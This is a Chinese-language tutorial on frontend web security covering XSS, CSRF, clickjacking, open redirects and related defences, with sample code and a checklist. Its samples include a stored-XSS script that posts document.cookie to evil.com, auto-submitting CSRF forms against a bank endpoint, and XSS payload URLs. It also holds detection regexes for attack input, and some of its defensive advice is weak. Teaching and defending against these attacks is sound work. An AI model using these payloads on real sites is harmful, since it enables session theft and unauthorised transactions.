# 前端安全深度解析 🛡️

## 🎯 文档概述

前端安全是Web应用安全的重要组成部分。本文档深入解析常见的前端安全漏洞，包括XSS、CSRF等攻击方式的原理、危害及防御策略，帮助开发者构建更安全的Web应用。

## 📋 目录

1. [XSS（跨站脚本攻击）深度解析](#xss)
2. [CSRF（跨站请求伪造）深度解析](#csrf)
3. [其他重要安全漏洞](#other-vulnerabilities)
4. [安全防御最佳实践](#best-practices)
5. [实战案例分析](#case-studies)
6. [安全检查清单](#security-checklist)

---

## 🚨 XSS（跨站脚本攻击）深度解析 {#xss}

### 什么是XSS攻击？

XSS（Cross-Site Scripting）是一种代码注入攻击，攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。当用户浏览被感染的页面时，嵌入其中的恶意脚本就会被执行。

### XSS攻击分类

#### 1. 存储型XSS（Stored XSS）

**原理**：恶意脚本永久存储在目标服务器上（如数据库、消息论坛、访客留言板等）

**攻击流程**：
```
攻击者 → 提交恶意脚本到服务器 → 服务器存储 → 用户访问页面 → 恶意脚本执行
```

**危险代码示例**：
```javascript
// 用户评论功能 - 存在XSS漏洞
function displayComment(comment) {
  document.getElementById('comments').innerHTML +=
    `<div class="comment">${comment}</div>`;
}

// 攻击者提交的恶意评论
const maliciousComment = `
  <script>
    // 窃取用户Cookie
    fetch('http://evil.com/steal', {
      method: 'POST',
      body: document.cookie
    });
  </script>
`;
```

**攻击效果**：
- 窃取用户Cookie和Session
- 重定向到恶意网站
- 在用户不知情的情况下执行操作

#### 2. 反射型XSS（Reflected XSS）

**原理**：恶意脚本通过URL参数传递，服务器将其直接反射到页面中

**攻击示例**：
```html
<!-- 搜索页面 - 存在反射型XSS -->
<form action="/search" method="GET">
  <input type="text" name="q" placeholder="输入搜索关键词">
  <button type="submit">搜索</button>
</form>

<!-- 服务器直接输出搜索关键词，未经过滤 -->
<div>搜索结果：{{query}}</div>
```

**恶意URL**：
```
http://vulnerable-site.com/search?q=<script>alert('XSS')</script>
```

#### 3. DOM型XSS

**原理**：通过修改页面的DOM环境在本地执行恶意脚本

**漏洞代码示例**：
```javascript
// 读取URL参数并直接写入DOM
function getUrlParam(name) {
  const urlParams = new URLSearchParams(window.location.search);
  return urlParams.get(name);
}

// 危险：直接使用innerHTML
document.getElementById('welcome').innerHTML =
  '欢迎 ' + getUrlParam('name');
```

**攻击URL**：
```
http://site.com/page?name=<img src=x onerror=alert('DOM XSS')>
```

### XSS攻击的危害

1. **Cookie窃取**：获取用户身份认证信息
2. **会话劫持**：冒充用户身份进行操作
3. **网络钓鱼**：重定向到伪造页面骗取信息
4. **恶意操作**：代替用户执行敏感操作
5. **信息泄露**：访问用户隐私数据

### XSS防御策略

#### 1. 输入验证和过滤

```javascript
// 输入验证函数
function validateInput(input) {
  // 移除危险字符
  const dangerous = /<script|javascript:|on\w+\s*=/gi;
  return input.replace(dangerous, '');
}

// 更严格的白名单过滤
function sanitizeInput(input) {
  const allowedTags = ['b', 'i', 'u', 'em', 'strong'];
  const allowedAttrs = ['class', 'id'];

  // 使用DOMPurify库进行安全过滤
  return DOMPurify.sanitize(input, {
    ALLOWED_TAGS: allowedTags,
    ALLOWED_ATTR: allowedAttrs
  });
}
```

#### 2. 输出编码

```javascript
// HTML实体编码
function htmlEncode(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}

// 安全的DOM操作
function safeSetContent(element, content) {
  // 使用textContent而不是innerHTML
  element.textContent = content;
}

// React中的安全实践
function SafeComponent({ userInput }) {
  return (
    <div>
      {/* React自动进行HTML转义 */}
      <p>{userInput}</p>

      {/* 危险：使用dangerouslySetInnerHTML */}
      <div dangerouslySetInnerHTML={{__html: userInput}} />

      {/* 安全：先进行清理 */}
      <div dangerouslySetInnerHTML={{
        __html: DOMPurify.sanitize(userInput)
      }} />
    </div>
  );
}
```

#### 3. 内容安全策略（CSP）

```html
<!-- CSP头部设置 -->
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self';
               script-src 'self' 'unsafe-inline' https://trusted-cdn.com;
               style-src 'self' 'unsafe-inline';
               img-src 'self' data: https:;">
```

```javascript
// 服务器端设置CSP
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', [
    "default-src 'self'",
    "script-src 'self' 'nonce-${nonce}'",
    "style-src 'self' 'unsafe-inline'",
    "img-src 'self' data: https:",
    "connect-src 'self' https://api.trusted.com"
  ].join('; '));
  next();
});
```

#### 4. HttpOnly Cookie

```javascript
// 设置HttpOnly Cookie防止XSS窃取
res.cookie('sessionId', sessionId, {
  httpOnly: true,    // 防止JavaScript访问
  secure: true,      // 只在HTTPS下传输
  sameSite: 'strict' // 防止CSRF攻击
});
```

---

## 🔒 CSRF（跨站请求伪造）深度解析 {#csrf}

### 什么是CSRF攻击？

CSRF（Cross-Site Request Forgery）是一种劫持用户已认证的会话，在用户不知情的情况下，以用户的身份向目标网站发送恶意请求的攻击方式。

### CSRF攻击原理

```
1. 用户登录受信任网站A，生成Cookie
2. 用户访问恶意网站B（未退出网站A）
3. 恶意网站B向网站A发送请求
4. 浏览器自动携带网站A的Cookie
5. 网站A收到请求，误以为是用户的正常操作
```

### CSRF攻击示例

#### 1. GET请求攻击

**目标网站转账接口**：
```javascript
// 银行转账API（存在CSRF漏洞）
app.get('/transfer', (req, res) => {
  const { to, amount } = req.query;
  const user = req.session.user; // 从session获取用户信息

  if (user) {
    // 执行转账操作
    transferMoney(user.account, to, amount);
    res.json({ success: true });
  } else {
    res.status(401).json({ error: '未登录' });
  }
});
```

**恶意网站的攻击代码**：
```html
<!-- 恶意网站页面 -->
<img src="http://bank.com/transfer?to=attacker&amount=10000"
     style="display:none">

<!-- 或者使用JavaScript自动发送请求 -->
<script>
  // 用户访问页面时自动执行转账
  fetch('http://bank.com/transfer?to=attacker&amount=10000', {
    credentials: 'include' // 包含Cookie
  });
</script>
```

#### 2. POST请求攻击

**目标网站接口**：
```javascript
// 修改密码API
app.post('/change-password', (req, res) => {
  const { newPassword } = req.body;
  const user = req.session.user;

  if (user) {
    updatePassword(user.id, newPassword);
    res.json({ success: true });
  }
});
```

**恶意网站攻击**：
```html
<!-- 自动提交的表单 -->
<form id="maliciousForm" action="http://bank.com/change-password" method="POST">
  <input type="hidden" name="newPassword" value="hacked123">
</form>

<script>
  // 页面加载时自动提交表单
  document.getElementById('maliciousForm').submit();
</script>
```

### CSRF防御策略

#### 1. CSRF Token验证

```javascript
// 生成CSRF Token
const crypto = require('crypto');

function generateCSRFToken() {
  return crypto.randomBytes(32).toString('hex');
}

// 在用户登录时生成Token
app.post('/login', (req, res) => {
  // 验证用户凭据...
  const csrfToken = generateCSRFToken();
  req.session.csrfToken = csrfToken;

  res.json({
    success: true,
    csrfToken: csrfToken
  });
});

// 验证CSRF Token的中间件
function validateCSRFToken(req, res, next) {
  const token = req.headers['x-csrf-token'] || req.body.csrfToken;

  if (!token || token !== req.session.csrfToken) {
    return res.status(403).json({ error: 'CSRF Token验证失败' });
  }

  next();
}

// 在敏感操作中使用CSRF保护
app.post('/transfer', validateCSRFToken, (req, res) => {
  // 执行转账操作
});
```

**前端实现**：
```javascript
// 获取CSRF Token
let csrfToken = '';

fetch('/api/csrf-token')
  .then(response => response.json())
  .then(data => {
    csrfToken = data.token;
  });

// 在请求中包含CSRF Token
function secureRequest(url, data) {
  return fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken
    },
    body: JSON.stringify(data),
    credentials: 'include'
  });
}

// 表单中包含隐藏的CSRF Token
function addCSRFTokenToForm(form) {
  const input = document.createElement('input');
  input.type = 'hidden';
  input.name = 'csrfToken';
  input.value = csrfToken;
  form.appendChild(input);
}
```

#### 2. SameSite Cookie属性

```javascript
// 设置SameSite属性
app.use(session({
  cookie: {
    sameSite: 'strict', // 严格模式，跨站请求不会发送Cookie
    // sameSite: 'lax',  // 宽松模式，某些跨站导航会发送Cookie
    secure: true,        // 只在HTTPS下传输
    httpOnly: true       // 防止XSS攻击
  }
}));

// 不同SameSite值的对比
const cookieOptions = {
  // strict: 完全禁止跨站请求携带Cookie
  sameSite: 'strict',

  // lax: 允许安全的跨站导航（如链接点击）携带Cookie
  sameSite: 'lax',

  // none: 允许所有跨站请求携带Cookie（需要secure=true）
  sameSite: 'none',
  secure: true
};
```

#### 3. 验证Referer头

```javascript
// Referer验证中间件
function validateReferer(req, res, next) {
  const referer = req.get('Referer');
  const host = req.get('Host');

  if (!referer || !referer.includes(host)) {
    return res.status(403).json({
      error: '请求来源验证失败'
    });
  }

  next();
}

// 使用Referer验证
app.post('/sensitive-action', validateReferer, (req, res) => {
  // 执行敏感操作
});
```

#### 4. 双重Cookie验证

```javascript
// 双重Cookie验证
function doubleCookieCSRF(req, res, next) {
  const cookieToken = req.cookies.csrfToken;
  const headerToken = req.headers['x-csrf-token'];

  if (!cookieToken || !headerToken || cookieToken !== headerToken) {
    return res.status(403).json({ error: 'CSRF验证失败' });
  }

  next();
}

// 设置CSRF Cookie
app.use((req, res, next) => {
  if (!req.cookies.csrfToken) {
    const token = generateCSRFToken();
    res.cookie('csrfToken', token, {
      httpOnly: false, // 允许JavaScript读取
      sameSite: 'strict'
    });
  }
  next();
});
```

---

## ⚠️ 其他重要安全漏洞 {#other-vulnerabilities}

### 1. 点击劫持（Clickjacking）

**攻击原理**：通过iframe将目标网站嵌入到恶意网站中，诱导用户点击

**攻击示例**：
```html
<!-- 恶意网站页面 -->
<style>
  iframe {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    opacity: 0; /* 透明iframe */
    z-index: 999;
  }

  .fake-button {
    position: absolute;
    top: 100px;
    left: 100px;
    width: 200px;
    height: 50px;
    background: red;
    color: white;
  }
</style>

<div class="fake-button">点击领取奖品</div>
<iframe src="http://bank.com/transfer-page"></iframe>
```

**防御策略**：
```javascript
// 1. X-Frame-Options头
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'DENY'); // 禁止被iframe嵌入
  // res.setHeader('X-Frame-Options', 'SAMEORIGIN'); // 只允许同源嵌入
  next();
});

// 2. Content-Security-Policy
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', "frame-ancestors 'none'");
  next();
});

// 3. JavaScript检测框架嵌入
if (window.top !== window.self) {
  // 页面被嵌入iframe中
  window.top.location = window.self.location;
}
```

### 2. 开放重定向漏洞

**漏洞代码**：
```javascript
// 危险：直接使用用户输入进行重定向
app.get('/redirect', (req, res) => {
  const url = req.query.url;
  res.redirect(url); // 可能重定向到恶意网站
});
```

**防御措施**：
```javascript
// 安全的重定向实现
const allowedDomains = ['trusted1.com', 'trusted2.com'];

function safeRedirect(req, res) {
  const url = req.query.url;

  // 1. 验证URL格式
  let parsedUrl;
  try {
    parsedUrl = new URL(url);
  } catch (e) {
    return res.status(400).json({ error: '无效URL' });
  }

  // 2. 检查域名白名单
  if (!allowedDomains.includes(parsedUrl.hostname)) {
    return res.status(403).json({ error: '不允许的重定向域名' });
  }

  // 3. 安全重定向
  res.redirect(url);
}
```

### 3. 敏感信息泄露

**常见泄露点**：
```javascript
// 1. 客户端暴露敏感配置
const config = {
  apiKey: 'secret-api-key', // 危险：API密钥暴露
  dbPassword: 'db-password' // 危险：数据库密码暴露
};

// 2. 控制台输出敏感信息
console.log('用户密码：', password); // 危险

// 3. 错误信息泄露
app.use((err, req, res, next) => {
  // 危险：将详细错误信息返回给客户端
  res.status(500).json({
    error: err.message,
    stack: err.stack // 泄露服务器内部信息
  });
});
```

**安全实践**：
```javascript
// 1. 环境变量配置
const config = {
  apiKey: process.env.API_KEY, // 从环境变量读取
  production: process.env.NODE_ENV === 'production'
};

// 2. 生产环境禁用console
if (config.production) {
  console.log = console.warn = console.error = () => {};
}

// 3. 安全的错误处理
app.use((err, req, res, next) => {
  // 记录详细错误到日志
  logger.error(err.stack);

  // 只返回安全的错误信息
  res.status(500).json({
    error: config.production ? '服务器内部错误' : err.message
  });
});

// 4. 代码混淆和压缩
// 使用webpack、rollup等工具进行代码混淆
```

### 4. 不安全的依赖

**检测和防护**：
```bash
# 使用npm audit检查漏洞
npm audit

# 自动修复已知漏洞
npm audit fix

# 检查过时的依赖
npm outdated

# 使用yarn检查
yarn audit
```

```javascript
// package.json中固定版本
{
  "dependencies": {
    "express": "4.18.2", // 固定版本而不是^4.18.2
    "lodash": "4.17.21"
  }
}

// 使用Snyk等工具持续监控
// 在CI/CD中集成安全检查
```

---

## 🛡️ 安全防御最佳实践 {#best-practices}

### 1. 安全编码规范

```javascript
// 1. 输入验证
function validateUserInput(input) {
  // 类型检查
  if (typeof input !== 'string') {
    throw new Error('输入必须是字符串');
  }

  // 长度限制
  if (input.length > 1000) {
    throw new Error('输入过长');
  }

  // 内容验证
  const dangerousPatterns = [
    /<script/i,
    /javascript:/i,
    /on\w+\s*=/i
  ];

  for (const pattern of dangerousPatterns) {
    if (pattern.test(input)) {
      throw new Error('输入包含危险内容');
    }
  }

  return true;
}

// 2. 安全的数据库查询
const mysql = require('mysql2');

// 危险：SQL注入风险
function unsafeQuery(userId) {
  const query = `SELECT * FROM users WHERE id = ${userId}`;
  return db.query(query);
}

// 安全：使用参数化查询
function safeQuery(userId) {
  const query = 'SELECT * FROM users WHERE id = ?';
  return db.query(query, [userId]);
}

// 3. 安全的文件操作
const path = require('path');

function safeFileAccess(filename) {
  // 防止路径遍历攻击
  const safePath = path.join('/safe/directory', filename);

  // 确保文件在安全目录内
  if (!safePath.startsWith('/safe/directory/')) {
    throw new Error('不安全的文件路径');
  }

  return safePath;
}
```

### 2. 安全头部设置

```javascript
// 完整的安全头部配置
app.use((req, res, next) => {
  // 防止点击劫持
  res.setHeader('X-Frame-Options', 'DENY');

  // 防止MIME类型嗅探
  res.setHeader('X-Content-Type-Options', 'nosniff');

  // XSS保护
  res.setHeader('X-XSS-Protection', '1; mode=block');

  // 强制HTTPS
  res.setHeader('Strict-Transport-Security',
    'max-age=31536000; includeSubDomains; preload');

  // 控制引用者信息
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');

  // 权限策略
  res.setHeader('Permissions-Policy',
    'geolocation=(), microphone=(), camera=()');

  // 内容安全策略
  res.setHeader('Content-Security-Policy', [
    "default-src 'self'",
    "script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com",
    "style-src 'self' 'unsafe-inline'",
    "img-src 'self' data: https:",
    "connect-src 'self' https://api.example.com",
    "font-src 'self' https://fonts.googleapis.com",
    "frame-ancestors 'none'",
    "base-uri 'self'",
    "form-action 'self'"
  ].join('; '));

  next();
});
```

### 3. 身份认证和授权

```javascript
// JWT安全实现
const jwt = require('jsonwebtoken');
const bcrypt = require('bcrypt');

class AuthService {
  // 密码加密
  static async hashPassword(password) {
    const saltRounds = 12; // 更高的复杂度
    return await bcrypt.hash(password, saltRounds);
  }

  // 密码验证
  static async verifyPassword(password, hash) {
    return await bcrypt.compare(password, hash);
  }

  // 生成JWT
  static generateToken(user) {
    const payload = {
      id: user.id,
      email: user.email,
      role: user.role
    };

    return jwt.sign(payload, process.env.JWT_SECRET, {
      expiresIn: '1h', // 短期过期
      issuer: 'your-app',
      audience: 'your-app-users'
    });
  }

  // 验证JWT
  static verifyToken(token) {
    try {
      return jwt.verify(token, process.env.JWT_SECRET);
    } catch (error) {
      throw new Error('无效的token');
    }
  }
}

// 权限验证中间件
function requireRole(requiredRole) {
  return (req, res, next) => {
    const token = req.headers.authorization?.split(' ')[1];

    if (!token) {
      return res.status(401).json({ error: '缺少认证token' });
    }

    try {
      const decoded = AuthService.verifyToken(token);

      if (decoded.role !== requiredRole) {
        return res.status(403).json({ error: '权限不足' });
      }

      req.user = decoded;
      next();
    } catch (error) {
      return res.status(401).json({ error: '无效的token' });
    }
  };
}
```

### 4. 安全监控和日志

```javascript
// 安全事件监控
class SecurityMonitor {
  static logSecurityEvent(type, details, req) {
    const event = {
      timestamp: new Date().toISOString(),
      type: type,
      ip: req.ip,
      userAgent: req.get('User-Agent'),
      details: details
    };

    // 记录到安全日志
    logger.warn('SECURITY_EVENT', event);

    // 严重事件立即告警
    if (type === 'POTENTIAL_ATTACK') {
      this.alertSecurityTeam(event);
    }
  }

  static alertSecurityTeam(event) {
    // 发送告警通知
    // 可以集成邮件、短信、Slack等
  }
}

// 攻击检测中间件
function detectAttacks(req, res, next) {
  const suspiciousPatterns = [
    /<script/i,
    /union\s+select/i,
    /\b(and|or)\b.*\b(sleep|benchmark)\b/i
  ];

  const userInput = JSON.stringify(req.query) + JSON.stringify(req.body);

  for (const pattern of suspiciousPatterns) {
    if (pattern.test(userInput)) {
      SecurityMonitor.logSecurityEvent('POTENTIAL_ATTACK', {
        pattern: pattern.toString(),
        input: userInput
      }, req);

      return res.status(400).json({ error: '请求被拒绝' });
    }
  }

  next();
}

// 请求限制
const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15分钟
  max: 100, // 限制每个IP在15分钟内最多100个请求
  message: '请求过于频繁，请稍后再试',
  standardHeaders: true,
  legacyHeaders: false
});

app.use('/api', limiter);
```

---

## 📊 实战案例分析 {#case-studies}

### 案例1：电商网站XSS攻击防护

**场景**：用户评论功能存在XSS漏洞

**漏洞代码**：
```javascript
// 存在漏洞的评论系统
app.post('/api/comments', (req, res) => {
  const { productId, comment } = req.body;

  // 直接存储用户输入，未进行过滤
  const newComment = {
    id: generateId(),
    productId,
    comment, // 危险：未过滤的用户输入
    createdAt: new Date()
  };

  db.comments.push(newComment);
  res.json({ success: true });
});

// 前端显示评论
function displayComments(comments) {
  const container = document.getElementById('comments');
  container.innerHTML = comments.map(comment => `
    <div class="comment">
      <p>${comment.comment}</p> <!-- 危险：直接输出HTML -->
      <span>${comment.createdAt}</span>
    </div>
  `).join('');
}
```

**修复方案**：
```javascript
// 服务器端安全处理
const DOMPurify = require('isomorphic-dompurify');

app.post('/api/comments', (req, res) => {
  const { productId, comment } = req.body;

  // 1. 输入验证
  if (!comment || comment.length > 500) {
    return res.status(400).json({ error: '评论内容无效' });
  }

  // 2. HTML清理
  const sanitizedComment = DOMPurify.sanitize(comment, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
    ALLOWED_ATTR: []
  });

  const newComment = {
    id: generateId(),
    productId,
    comment: sanitizedComment,
    createdAt: new Date()
  };

  db.comments.push(newComment);
  res.json({ success: true });
});

// 前端安全显示
function displayComments(comments) {
  const container = document.getElementById('comments');

  // 使用安全的DOM操作
  container.innerHTML = '';

  comments.forEach(comment => {
    const div = document.createElement('div');
    div.className = 'comment';

    const p = document.createElement('p');
    p.textContent = comment.comment; // 安全：使用textContent

    const span = document.createElement('span');
    span.textContent = comment.createdAt;

    div.appendChild(p);
    div.appendChild(span);
    container.appendChild(div);
  });
}
```

### 案例2：银行系统CSRF攻击防护

**场景**：网银转账功能的CSRF防护

**完整防护方案**：
```javascript
// 后端实现
const express = require('express');
const session = require('express-session');
const crypto = require('crypto');

const app = express();

// 会话配置
app.use(session({
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true, // HTTPS only
    httpOnly: true,
    maxAge: 30 * 60 * 1000, // 30分钟
    sameSite: 'strict'
  }
}));

// CSRF Token生成
function generateCSRFToken() {
  return crypto.randomBytes(32).toString('hex');
}

// 获取CSRF Token
app.get('/api/csrf-token', (req, res) => {
  if (!req.session.csrfToken) {
    req.session.csrfToken = generateCSRFToken();
  }

  res.json({ token: req.session.csrfToken });
});

// CSRF验证中间件
function validateCSRF(req, res, next) {
  const token = req.headers['x-csrf-token'] || req.body.csrfToken;
  const sessionToken = req.session.csrfToken;

  if (!token || !sessionToken || token !== sessionToken) {
    return res.status(403).json({
      error: 'CSRF验证失败',
      code: 'CSRF_INVALID'
    });
  }

  // 每次使用后重新生成token（一次性token）
  req.session.csrfToken = generateCSRFToken();

  next();
}

// 安全的转账接口
app.post('/api/transfer', validateCSRF, async (req, res) => {
  try {
    const { toAccount, amount, password } = req.body;
    const user = req.session.user;

    // 1. 用户认证检查
    if (!user) {
      return res.status(401).json({ error: '未登录' });
    }

    // 2. 密码二次验证
    const isValidPassword = await verifyPassword(user.id, password);
    if (!isValidPassword) {
      return res.status(401).json({ error: '密码错误' });
    }

    // 3. 业务规则验证
    if (amount <= 0 || amount > user.balance) {
      return res.status(400).json({ error: '转账金额无效' });
    }

    // 4. 执行转账
    const result = await executeTransfer(user.account, toAccount, amount);

    // 5. 记录操作日志
    logSecurityEvent('TRANSFER', {
      from: user.account,
      to: toAccount,
      amount: amount
    }, req);

    res.json({
      success: true,
      transactionId: result.id,
      newCSRFToken: req.session.csrfToken // 返回新的token
    });

  } catch (error) {
    logger.error('Transfer error:', error);
    res.status(500).json({ error: '转账失败' });
  }
});

// 前端实现
class SecureBankingClient {
  constructor() {
    this.csrfToken = null;
    this.init();
  }

  async init() {
    await this.refreshCSRFToken();
  }

  async refreshCSRFToken() {
    try {
      const response = await fetch('/api/csrf-token', {
        credentials: 'include'
      });
      const data = await response.json();
      this.csrfToken = data.token;
    } catch (error) {
      console.error('获取CSRF Token失败:', error);
    }
  }

  async secureRequest(url, data) {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': this.csrfToken
      },
      body: JSON.stringify(data),
      credentials: 'include'
    });

    const result = await response.json();

    // 更新CSRF Token
    if (result.newCSRFToken) {
      this.csrfToken = result.newCSRFToken;
    }

    return result;
  }

  async transfer(toAccount, amount, password) {
    try {
      const result = await this.secureRequest('/api/transfer', {
        toAccount,
        amount,
        password
      });

      if (result.success) {
        alert('转账成功！');
      } else {
        alert('转账失败：' + result.error);
      }
    } catch (error) {
      console.error('转账请求失败:', error);
      alert('网络错误，请重试');
    }
  }
}

// 使用示例
const bankClient = new SecureBankingClient();

document.getElementById('transferForm').addEventListener('submit', async (e) => {
  e.preventDefault();

  const formData = new FormData(e.target);
  await bankClient.transfer(
    formData.get('toAccount'),
    parseFloat(formData.get('amount')),
    formData.get('password')
  );
});
```

---

## ✅ 安全检查清单 {#security-checklist}

### 前端安全检查清单

#### 输入验证
- [ ] 所有用户输入都经过验证和过滤
- [ ] 使用白名单而非黑名单进行过滤
- [ ] 客户端和服务器端都进行验证
- [ ] 限制输入长度和格式

#### XSS防护
- [ ] 使用textContent而非innerHTML
- [ ] 对用户输入进行HTML编码
- [ ] 实施内容安全策略（CSP）
- [ ] 避免使用eval()和类似函数
- [ ] 设置HttpOnly Cookie

#### CSRF防护
- [ ] 使用CSRF Token验证
- [ ] 设置SameSite Cookie属性
- [ ] 验证Referer头部
- [ ] 敏感操作使用POST请求

#### 身份认证
- [ ] 使用强密码策略
- [ ] 实施多因素认证
- [ ] Token有合理的过期时间
- [ ] 安全存储用户凭据

#### 数据保护
- [ ] 使用HTTPS传输
- [ ] 敏感数据加密存储
- [ ] 最小权限原则
- [ ] 定期清理敏感数据

#### 配置安全
- [ ] 设置安全HTTP头部
- [ ] 禁用不必要的HTTP方法
- [ ] 隐藏服务器版本信息
- [ ] 定期更新依赖包

#### 监控和日志
- [ ] 记录安全相关事件
- [ ] 实施入侵检测
- [ ] 定期安全审计
- [ ] 建立应急响应计划

---

## 🔗 相关资源

### 官方文档
- [OWASP Web安全指南](https://owasp.org/www-project-web-security-testing-guide/)
- [MDN Web安全](https://developer.mozilla.org/en-US/docs/Web/Security)
- [Content Security Policy参考](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

### 安全工具
- **代码扫描**: ESLint Security Plugin, SonarQube
- **依赖检查**: npm audit, Snyk, WhiteSource
- **渗透测试**: OWASP ZAP, Burp Suite
- **内容过滤**: DOMPurify, validator.js

### 学习资源
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PortSwigger Web安全学院](https://portswigger.net/web-security)
- [Google Web安全基础](https://web.dev/security/)

---

**⚠️ 重要提醒**：
- 安全是一个持续的过程，需要定期更新和改进
- 本文档提供的是基础防护策略，实际应用中需要根据具体场景调整
- 建议定期进行安全审计和渗透测试
- 保持对最新安全威胁和防护技术的关注

📝 *最后更新：2025年9月17日*